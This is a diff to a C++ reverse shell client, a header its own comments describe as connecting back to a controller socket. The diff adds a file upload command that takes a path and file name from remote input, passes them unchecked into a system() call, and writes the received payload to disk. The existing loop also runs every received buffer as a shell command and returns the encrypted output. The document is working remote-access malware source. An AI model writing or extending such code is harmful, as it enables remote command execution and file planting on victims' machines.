@@ -3,24 +3,9 @@
 // reverse shell header file using IPV4 
 // connects to shmain socket
 
-#include <iostream>
-#include <string.h>
-#include <string>
-#include <sys/time.h>
-#include <thread>
-#include <map>
-#include <signal.h>
+#include "utils.hpp"
 
-//NETWORKING
-#include <unistd.h>
-#include <netinet/in.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <limits.h>
-#include <arpa/inet.h>
-#include <netdb.h>
-
-#define BUFFER_SIZE 4096
+const unsigned int BUFFER_SIZE = 9999;
 
 struct secondsh{
     int bytes_red = (int) NULL;
@@ -100,6 +85,21 @@ struct secondsh{
  
     }
 
+     // used to split string
+    template<typename Out>
+    void split(const std::string &s, char delim, Out result) {
+        std::stringstream ss(s);
+        std::string item;
+        while (std::getline(ss, item, delim)) {
+            *(result++) = item;
+        }
+    }
+
+    std::vector<std::string> split(const std::string &s, char delim) {
+        std::vector<std::string> elems;
+        split(s, delim, std::back_inserter(elems));
+        return elems;
+    }
 
     int* connect_socket(unsigned int PORT, const std::string hostname){
         signal(SIGPIPE, SIG_IGN); // used to handle SIGPIPE, if not ignored it crashes
@@ -164,13 +164,9 @@ struct secondsh{
 
             std::string s_buffer = std::string(buffer);
             std::string token = s_buffer.substr(0, s_buffer.find(" "));
-            
-
-            if(read < 0){
-                printf("recv error: %s\n", strerror(errno));
-            }
+        
             // disconnect from socket (but secondsh is still on)
-            else if(!strcmp(buffer, "disconnect")){
+            if(!strcmp(buffer, "disconnect")){
                 close(global_socket); // close socket
                 
                 std::chrono::seconds duration(2);
@@ -203,6 +199,30 @@ struct secondsh{
                 strcpy(buffer, ncrypt(out).c_str());
                 bytes_written += send(global_socket, (char*)&buffer, strlen(buffer)+1, 0);
             }
+
+            else if(token == "upload"){
+                std::vector<std::string> vec = split(std::string(buffer), ' ');
+                std::string upload_dir = vec[2];
+                std::string file_name = vec[3];
+                
+                memset(buffer, 0x00, sizeof(buffer));
+                bytes_red += recv(global_socket, (char*)&buffer, sizeof(buffer), 0);
+
+                std::string file_content = dcrypt(std::string(buffer));
+                std::string mk_file = "touch " + upload_dir + "/" + file_name;
+                system(mk_file.c_str());
+               
+
+                std::ofstream file;
+                file.open(upload_dir+"/"+file_name);
+                file << dcrypt(std::string(buffer)) << std::endl;
+                file.flush();
+                file.close();
+
+                
+
+            }
+
             system(buffer);
             std::string cmd_out = system_output(std::string(buffer));
             std::string crypt_out = ncrypt(cmd_out);
